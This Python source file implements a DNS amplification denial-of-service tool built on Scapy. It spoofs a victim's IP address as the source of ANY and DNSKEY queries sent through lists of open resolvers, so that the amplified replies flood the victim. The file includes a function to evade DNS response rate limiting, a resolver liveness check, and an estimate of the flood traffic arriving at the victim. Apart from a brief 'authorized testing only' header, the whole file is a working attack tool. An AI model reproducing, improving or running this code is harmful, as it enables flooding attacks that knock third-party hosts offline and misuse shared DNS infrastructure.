# SPDX-License-Identifier: MIT
# Copyright (c) 2026 r3vskd
# Version: 2.1.0
# Status: stable
# Maintained: yes
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy.

WARNING: For authorized penetration testing only. Using this tool against
systems without explicit written permission is illegal.
Requires root/administrator privileges. Linux only for IP spoofing.
"""

import os
import random as _random
import socket as _socket
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

DEFAULT_VICTIM_PORT = 53  # RFC 1035 standard DNS port

# DNS query type to wire-format integer mapping (RFC 1035 + RFC 3596 + others)
QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}

# Typical DNS amplification factors (response_bytes / query_bytes) per qtype
_AMP_ESTIMATE = {
    'ANY': 60, 'DNSKEY': 40, 'DS': 30, 'TXT': 15, 'NS': 10,
    'MX': 8, 'SOA': 6, 'AAAA': 4, 'A': 3, 'PTR': 5,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):  # thin wrapper to allow patching in tests
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


# ─── Feature 1: Resolver health checking ──────────────────────────────────────

def health_check_resolver(resolver_ip, resolver_port, timeout=2.0):
    """Send a real (non-spoofed) A query to test if resolver is alive."""
    try:
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.settimeout(timeout)
        # Minimal DNS A query for "." (root)
        query = (
            b'\x13\x37'  # TXID
            b'\x01\x00'  # Standard query, RD=1
            b'\x00\x01'  # QDCOUNT=1
            b'\x00\x00\x00\x00\x00\x00'  # AN/NS/AR = 0
            b'\x00'      # Root domain (empty label)
            b'\x00\x01'  # QTYPE A
            b'\x00\x01'  # QCLASS IN
        )
        s.sendto(query, (resolver_ip, resolver_port))
        s.recv(512)
        s.close()
        return True
    except Exception:
        return False


def health_check_resolvers(resolvers, port, timeout=2.0, verbose=False):
    """Filter resolver list, removing dead/non-responding resolvers.

    Returns list of alive resolvers and prints summary.
    """
    alive = []
    dead = []
    total = len(resolvers)
    for i, resolver in enumerate(resolvers, 1):
        ip = resolver.strip()
        if not ip:
            continue
        ok = health_check_resolver(ip, port, timeout)
        if verbose:
            status = "\033[32mOK\033[0m" if ok else "\033[31mDEAD\033[0m"
            print(f"  [{i:>3}/{total}] {ip:<20} {status}")
        if ok:
            alive.append(resolver)
        else:
            dead.append(resolver)
    print(f"Health check: {len(alive)}/{total} resolvers alive "
          f"({len(dead)} dead, removed)")
    return alive


# ─── Feature 2: Rate limiting bypass ──────────────────────────────────────────

def _bypass_ratelimit(domain, victim_src_port):
    """Return (modified_domain, randomized_sport) to evade DNS RRL."""
    # Random 6-char hex subdomain defeats response rate limiting (RRL)
    # which caches by exact <qname, qtype, client_ip> tuple
    prefix = _random.randbytes(3).hex()
    modified_domain = f"{prefix}.{domain.strip('.')}"
    # Randomize source port so resolver sees each query as a distinct client
    randomized_sport = _random.randint(1024, 65535)
    return modified_domain, randomized_sport


# ─── Feature 3: Traffic volume estimation ─────────────────────────────────────

def estimate_traffic_volume(num_resolvers, num_queries, qtype='ANY',
                            edns_payload=4096, interval=0.0):
    """Print estimated inbound traffic volume at victim.

    Cannot measure at victim side without presence there, so we use
    known average amplification ratios per qtype.
    """
    query_size = 28 + (11 if edns_payload > 0 else 0)  # DNS wire bytes approx
    amp_factor = _AMP_ESTIMATE.get(qtype.upper(), 10)
    avg_response = query_size * amp_factor
    total_queries = num_resolvers * num_queries
    # Duration: burst = ~1s, interval mode = total_queries * interval
    duration = max(total_queries * interval, 1.0) if interval > 0 else 1.0
    bps = (total_queries * avg_response) / duration
    mbps = (bps * 8) / 1_000_000
    pps = total_queries / duration

    print(f"\n{'='*50}")
    print(f"  Traffic estimate at victim ({qtype} / EDNS={edns_payload})")
    print(f"{'='*50}")
    print(f"  Resolvers used    : {num_resolvers}")
    print(f"  Queries fired     : {total_queries}")
    print(f"  Amplification     : ~{amp_factor}x  ({query_size}B query -> ~{avg_response}B response)")
    print(f"  Duration estimate : {duration:.1f}s")
    print(f"  Inbound at victim : ~{mbps:.2f} Mbps  (~{pps:.0f} pps)")
    print(f"{'='*50}\n")
    return mbps


# ─── Core spoofed send functions ───────────────────────────────────────────────

def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,  # noqa: PLR0913 -- intentional wide interface for CLI passthrough
                           victim_src_port=DEFAULT_VICTIM_PORT, qtype='ANY',
                           edns_payload=4096, dnssec_do=False, txid=0x1337,
                           id_random=False, verbose=False, measure=False,
                           qclass=1, ratelimit_bypass=False):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    effective_domain = domain
    effective_sport = victim_src_port

    if ratelimit_bypass:
        effective_domain, effective_sport = _bypass_ratelimit(domain, victim_src_port)
        id_random = True  # force TXID randomization

    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)  # default to A on unknown type
    question = DNSQR(qname=effective_domain.strip('.'), qtype=qtype_int, qclass=qclass)

    if edns_payload > 0:
        edns_do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=edns_do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)

    pkt = (IP(src=victim_ip, dst=resolver_ip) /
           UDP(sport=effective_sport, dport=resolver_port) /
           pkt_dns)

    if verbose:
        bypass_tag = " [ratelimit_bypass]" if ratelimit_bypass else ""
        print(f"Spoofed{bypass_tag}: {victim_ip}:{effective_sport} -> "
              f"{resolver_ip}:{resolver_port} qtype={qtype} domain={effective_domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")

    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1, ratelimit_bypass=False,
                                           healthcheck=False,
                                           healthcheck_timeout=2.0,
                                           estimate=False):
    """Spawn one thread per resolver x query, spoofing victim_ip as source."""
    if not resolvers:  # nothing to do
        return

    resolvers = list(resolvers)

    # Feature 2: health check before firing
    if healthcheck:
        print(f"Running health check on {len(resolvers)} resolvers...")
        resolvers = health_check_resolvers(resolvers, resolver_port,
                                           timeout=healthcheck_timeout,
                                           verbose=verbose)
        if not resolvers:
            print("[error] No alive resolvers after health check. Aborting.")
            return

    # Feature 3: pre-flight traffic estimate
    if estimate:
        estimate_traffic_volume(len(resolvers), num_queries, qtype,
                                edns_payload, interval if not burst else 0.0)

    total = len(resolvers) * num_queries
    fired = 0
    threads = []

    for resolver in (r.strip() for r in resolvers if r.strip()):
        for _ in range(num_queries):
            t = _threading.Thread(
                target=send_spoofed_dns_query,
                args=(domain, resolver, resolver_port, victim_ip,
                      victim_src_port, qtype, edns_payload, dnssec_do,
                      txid, id_random, verbose, measure, qclass,
                      ratelimit_bypass))
            threads.append(t)
            t.start()
            fired += 1
            if verbose:
                print(f"[{fired}/{total}] Spoofing via {resolver}")
            if not burst:
                _time_sleep(interval)

    for t in threads:
        t.join()
    threads.clear()
